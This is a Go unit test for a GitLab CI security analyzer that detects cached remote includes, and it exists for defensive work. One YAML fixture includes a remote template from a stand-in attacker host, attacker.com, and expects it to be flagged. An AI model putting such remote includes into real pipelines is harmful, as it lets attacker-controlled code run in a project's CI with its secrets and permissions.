package analyze

import "testing"

func TestDetectIncludeRemoteCached(t *testing.T) {
	tests := []struct {
		name      string
		yaml      string
		wantFound bool
	}{
		{
			name: "cached remote include - finding",
			yaml: `
include:
  - remote: https://attacker.com/template.yml
    cache: "1h"

job1:
  script:
    - echo "test"
`,
			wantFound: true,
		},
		{
			name: "non-cached remote include - no finding",
			yaml: `
include:
  - remote: https://example.com/template.yml

job1:
  script:
    - echo "test"
`,
			wantFound: false,
		},
		{
			name: "local include - no finding",
			yaml: `
include:
  - local: .gitlab/ci/build.yml

job1:
  script:
    - echo "test"
`,
			wantFound: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			doc := mustParseDoc(t, tc.yaml)
			findings := detectIncludeRemoteCached(doc)
			found := hasFindingID(findings, IncludeRemoteCachedID)
			if found != tc.wantFound {
				t.Errorf("found=%v want=%v; findings=%+v", found, tc.wantFound, findings)
			}
		})
	}
}
